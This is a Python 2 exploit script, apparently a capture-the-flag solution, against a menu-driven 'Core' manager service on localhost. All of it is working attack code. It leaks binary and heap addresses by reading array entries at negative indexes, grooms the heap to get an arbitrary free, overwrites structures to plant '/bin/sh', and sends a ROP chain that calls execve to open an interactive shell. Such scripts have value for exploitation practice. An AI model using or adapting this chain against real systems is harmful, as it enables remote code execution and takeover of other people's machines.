from pwnlib import *


s = Socket(("localhost", 6767))
print s.ru("\n4. Remove Core\n5. Interact with Core\n\nSelection: ")


# add a CJ core
s.ru("")
s.send("1\n")

s.ru("election: ")
s.send("2\n")

s.ru("election: ")



# add an array core 
s.send("1\n")

s.ru("election: ")
s.send("3\n")

s.ru("election: ")


# add a raw core, R, do not initialize it
s.send("1\n")

s.ru("election: ")
s.send("7\n")

s.ru("election: ")





# init the array core
s.send("5\n")

s.ru("e Number: ")
s.send("3\n")

s.ru("you want? ")
s.send("1\n")

s.ru("election: ")


# add a huge raw core, S
s.send("1\n")

s.ru("election: ")
s.send("7\n")

s.ru("election: ")
s.send("5\n")

s.ru("e Number: ")
s.send("5\n")

SIZE = 1000

s.ru("llocated? ")
s.send("%d\n" % SIZE)

s.ru("election: ")




# read backwards and leak heap base, bin base
def leak(offset):
	s.send("5\n")

	s.ru("Number: ")
	s.send("3\n")

	s.ru(" Read Array Entry\n3. Write Array Entry\nSelection: ")
	s.send("2\n")

	s.ru("Which Array Entry: ")
	s.send("%d\n" % offset)

	s.ru("Value: ")
	result = int(s.ru("\n"))

	s.ru("\n4. Remove Core\n5. Interact with Core\n\nSelection: ")
	return result


bin_base = leak(-22) - 0x24d60
heap_base = leak(-6) & ~0xfff

print "bin:  0x%x" % bin_base
print "heap: 0x%x" % heap_base

# spray the heap with the raw core
s.send("5\n")

s.ru("e Number: ")
s.send("5\n")

s.ru("lection: \n")
s.send("2\n")

buf_addr = heap_base + 0x2b0

payload = bytearray(pattern(SIZE))
payload[0x30:0x38] = pq(buf_addr) # target to free


s.ru(" bytes\n")
s.send(payload)


# free the raw core
s.ru("election: ")
s.send("4\n")

s.ru("e Number: ")
s.send("5\n")

s.ru("election: ")


# add two raw cores
s.send("1\n")

s.ru("election: ")
s.send("7\n")

s.ru("")
s.send("1\n")

s.ru("election: ")
s.send("7\n")


# make a new raw to target 
s.ru("election: ")
s.send("1\n")

s.ru("election: ")
s.send("7\n")

s.ru("election: ")
s.send("5\n")

s.ru("e Number: ")
s.send("7\n")


s.ru("llocated? ")
s.send("1000\n")

s.ru("election: ")





# free raw core to free-what-where
# target a raw buffer
s.send("4\n")

s.ru("e Number: ")
s.send("6\n")



# alloc some more cores
for _ in range(3):
	s.ru("election: ")
	s.send("1\n")

	s.ru("election: ")
	s.send("6\n")



# overwrite cores
s.ru("election: ")
s.send("5\n")

s.ru("e Number: ")
s.send("6\n")

s.ru("lection: \n")
s.send("2\n")


payload = bytearray(pattern(1000))
payload[0:8] = pq(buf_addr + 8)
payload[8:16] = pq(buf_addr + 0x10 - 0x10)
payload[0x10:0x18] = pq(bin_base + 0x1e4a)
payload[0x18:0x20] = "/bin/sh\0"

s.ru("bytes\n")
s.send(payload)


s.ru("election: ")


# trigger
s.send("3\n") # list cores
s.ru("flow Core\n")


syscall = 0x000006bda + bin_base # syscall ; ret
pop_rax_pop2 = 0x00000358a + bin_base # pop rax ; pop rbx ; pop rbp ; ret
pop_rdi = 0x000002229 + bin_base # pop rdi ; ret
pop_rsi = 0x000001144 + bin_base # pop rsi ; ret
pop_rdx_pop2 = 0x60e8 + bin_base # pop rdx ; ret


rop  = pq(pop_rax_pop2)
rop += pq(59)*3
rop += pq(pop_rdi)
rop += pq(buf_addr + 0x18) # "/bin/sh"
rop += pq(pop_rsi)
rop += pq(0)
rop += pq(pop_rdx_pop2)
rop += pq(0)*3
rop += pq(syscall)

payload = bytearray(pattern(0x300))
payload[0x28:0x28 + len(rop)] = rop
payload = str(payload)
assert "\n" not in payload

s.send(payload)
time.sleep(1)
s.send("\n")



s.interact()
